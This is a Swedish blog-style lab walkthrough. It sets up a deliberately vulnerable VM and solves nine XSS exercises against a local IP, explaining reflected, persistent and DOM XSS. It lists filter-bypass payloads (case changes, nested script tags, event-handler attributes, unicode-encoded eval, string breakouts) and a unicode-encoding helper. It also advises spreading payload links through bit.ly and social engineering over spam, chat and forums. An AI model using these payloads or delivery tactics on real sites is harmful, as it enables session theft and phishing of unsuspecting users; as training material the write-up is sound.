<h1>Installera</h1>
<p>Så. Först måste du ladda ner VirtualBox. Därefter skapa en ny linuxmaskin, 32bit.<br />
Därefter laddar du ner .iso-filen. Klickas på settings i din maskin, och sedan på storeage, där det är empy lägger du till iso-filen. Sen går du över till nätverk å byter från LAN till Bridged.<br />
Sedan startar du den virtuella maskinen. När den har laddat klart kör du kommandot:<br />
ifconfig<br />
Då får du reda på datorns interna ip. Kopiera det å klistra in det i den browser, så kommer sidan upp.</p>
<h2>XSS</h2>
<p>Det finns i princip två sorters XSS. <strong>Persistent</strong> och <strong>non-persistent</strong>. Dessa kan även bveskrivas som Server och DOM attacker. Non-persistrent kallas ibland även för reflected.<br />
Non-persistent: reflected.<br />
Persitent: Server<br />
I persistent så sparas scriptet, eller koden, i serverns databas. Så nästa gång som någon besöker sidan och servern skickar infon från databasen så innehåller den scriptet.<br />
Persistent är självklart inte lika vanligt som non-persistent. Men det är mycket farligare attack.</p>
<p>Det finns även self-propagating.</p>
<p>Non-persistent/reflected.<br />
Som man kan sedan nedan så kan XSS-attacker utföras direkt i adressfältet. Problemet är dock att attacken bara utsätter attackeraren själv som kör skriptet (när hen laddar sidan). Därför måste vi alltså lyckas transportera adressen med scriptet i till en annan användare. Detta kan göras genom url-förkortningar.<br />
Google short blockerar om man försöker lägga in script. Men inte:<br />
https://bitly.com/shorten/<br />
Sedan krävs det vanlig hederlig social engineering. De vanligaste sätten är att skicka länkarna via spam eller via typ chatklienter. Typ skype. Ett annat sätt är att publicera länken på forum eller i kommentarsfält. Då kan man dessutom "gömma" adressen i en a href-tag.</p>
<p>Exempel 1.<br />
Vi kan direkt se att i adressfältet kan man sätta in text som sedan skrivs ut på sidan.<br />
[code lang="html"]<br />
http://192.168.1.101/xss/example1.php?name=hacker<br />
[/code]<br />
Här kan man alltså testa att sätta in ett script för att pröva om det exekivieras.<br />
[code lang="html"]<br />
http://192.168.1.101/xss/example1.php?name=&amp;lt;script&amp;gt;alert(&amp;quot;hej&amp;quot;)&amp;lt;/script&amp;gt;<br />
[/code]</p>
<p><strong>Exempel 2.</strong><br />
Här kan vi notera att om vi testar<br />
[code lang="html"]<br />
http://192.168.1.101/xss/example1.php?name=&amp;lt;script&amp;gt;alert(&amp;quot;hej&amp;quot;)&amp;lt;/script&amp;gt;<br />
[/code]</p>
<p>Så skrivs bara alert("hej") ut. Vilket tyder på att något filtrerar bort script-taggarna. Vilket gör att scriptet tolkas som text och inte som kod.</p>
<p>För att komma runt det så kan vi köra den enklaste formen.</p>
<p>[code lang="html"]<br />
http://192.168.1.101/xss/example1.php?name=&amp;lt;Script&amp;gt;alert(&amp;quot;hej&amp;quot;)&amp;lt;/Script&amp;gt;<br />
[/code]</p>
<p>Alltså, vi ändrade så att script stavas med stor bokstav. Den regex filtrering som hade implementeras hade inte tänkt så långt.</p>
<p><strong>Exempel 3</strong><br />
Den här var lite knivigare. Hela </p>
<p>[code lang="js"]<br />
&amp;lt;script&amp;gt;<br />
[/code]<br />
Här nu bortfiltrerad.<br />
Knepet blir därför att köra<br />
[code lang="js"]<br />
http://192.168.1.101/xss/example3.php?name=&amp;lt;scri&amp;lt;script&amp;gt;pt&amp;gt;alert(&amp;quot;xss&amp;quot;)&amp;lt;/scri&amp;lt;/script&amp;gt;pt&amp;gt;<br />
[/code]</p>
<p><strong>Exempel 4</strong><br />
Här har script helt å hållet filtrerats bort. Då får vi istället injecta javascript i andra taggar.<br />
andra taggar där man kan göra det är<br />
a<br />
img<br />
[code lang="js"]<br />
http://192.168.1.101/xss/example4.php?name=hacker&amp;lt;img src=&amp;quot;jj&amp;quot; onerror=&amp;quot;alert('hello')&amp;quot;/&amp;gt;</p>
<p>http://192.168.1.101/xss/example4.php?name=hacker%3Ca%20onclick=%22alert(%27hej%27)%22%20href=%22test%22/%3Ehejejej%3C/a%3E</p>
<p>http://192.168.1.101/xss/example4.php?name=hacker&amp;lt;a href=&amp;quot;alert(&amp;quot;hej&amp;quot;);&amp;quot;&amp;gt;klicka mig&amp;lt;/a&amp;gt;</p>
<p>http://192.168.1.101/xss/example4.php?name=hacker&lt;button%20onclick=%27alert(&quot;hello&quot;)%27&gt;button&lt;/button&gt;</p>
<p>http://192.168.1.101/xss/example4.php?name=hacker%3Cimg%20src=%22ff%22%20onclick=%27alert(%22hej%22)%27%3E</p>
<p>http://192.168.1.101/xss/example4.php?name=hacker%3Cp%20onmouseup=%27alert(%22hello%22)%27%3EClick%20the%20text!%3C/p%3E</p>
<p>http://192.168.1.101/xss/example4.php?name=hacker%3Cp%20onmousedown=%27alert(%22hello%22)%27%3EClick%20the%20text!%3C/p%3E<br />
[/code]</p>
<p>Här funkar alltså alla javascript functioner men till element som inte innehåller ordet script.</p>
<p><strong>Exempel 5</strong><br />
I Exempel 5 verkar det som att de tillåter script-taggen igen men nu är det alert som är sanitized. Det är enkelt att komma undan. Om vi vill få upp en pop-up så kan vi antingen köra:<br />
[code lang="js"]<br />
http://192.168.1.101/xss/example5.php?name=hacker&lt;script&gt;prompt(&quot;hello&quot;)&lt;/script&gt;</p>
<p>//eller<br />
http://192.168.1.101/xss/example5.php?name=hacker&lt;script&gt;confirm(&quot;hello&quot;)&lt;/script&gt;</p>
<p>//Eller så skriver vi scriptet i unicode-tecken.</p>
<p>http://192.168.1.101/xss/example5.php?name=hacker%3Cscript%3Eeval(%22u0061u006Cu0065u0072u0074u0028u0027u0068u0065u006Cu006Cu006Fu0027u0029%22);%3C/script%3E<br />
[/code]</p>
<p>Scriptet kan alltså skrivas i unicode-format. Eval utför koden oavsett om det är unicode/utf8/hexadecimal.<br />
Om du enkelt vill förvanla utf8-text till unicode kan du använda den här koden:<br />
[code lang="js"]<br />
function toUnicode(theString) {<br />
  var unicodeString = '';<br />
  for (var i=0; i &lt; theString.length; i++) {<br />
    var theUnicode = theString.charCodeAt(i).toString(16).toUpperCase();<br />
    while (theUnicode.length &lt; 4) {<br />
      theUnicode = '0' + theUnicode;<br />
    }<br />
    theUnicode = '\u' + theUnicode;<br />
    unicodeString += theUnicode;<br />
  }<br />
  return unicodeString;<br />
}<br />
var uni = toUnicode(script);<br />
console.log(uni);<br />
[/code]</p>
<p><strong>Exempel 6.</strong><br />
Här har det skett lite. Om vi kollar i källkoden så ser vi att det vi skickar in blir tolkat som att det är en del av en string som sätts in i en variabel.<br />
För att lösa det behöver vi först avsluta stringen å sedan lägga in vår kod, å sedan kommentera ut efterföljande kod.<br />
[code lang="js"]<br />
http://192.168.1.101/xss/example6.php?name=hacker&quot;;alert(&quot;hello&quot;);//<br />
[/code]</p>
<p><strong>Exempel 7.</strong><br />
Här kan vi notera i källkoden att det är ungefär samma problem som Exempel 6. Skillnaden är bara att nu filteras alla "". Så vi använder bara '' istället</p>
<p>[code lang="js"]<br />
http://192.168.1.101/xss/example7.php?name=';alert('hello');//<br />
[/code]</p>
<p><strong>Exempel 8.</strong><br />
Om vi klickar runt lite så kan vi se att vi kan injecta saker in i form-taggen. Där kan vi sen injecta vår alert via en onclick.<br />
[code lang="js"]<br />
http://192.168.1.101/xss/example8.php/%22onclick=%22alert('hello');<br />
[/code]</p>
<p><strong>Exempel 9.</strong><br />
Den sista var ganska så enkel. koden i källkoden såg ut såhär:</p>
<p>[code lang="js"]<br />
&lt;script&gt;<br />
  document.write(location.hash.substring(1));<br />
&lt;/script&gt;<br />
[/code]</p>
<p>Vilket betyder att den skriver ut på hemsidan (document.write) vad som finns i adressen efter hash-markören. Alltså efter #</p>
<p>Detta är ett exempel på en DOM-based attack. Hemsidan kan vara statisk men det finns ändå risk genom att man skriver document.write(location.hash)</p>
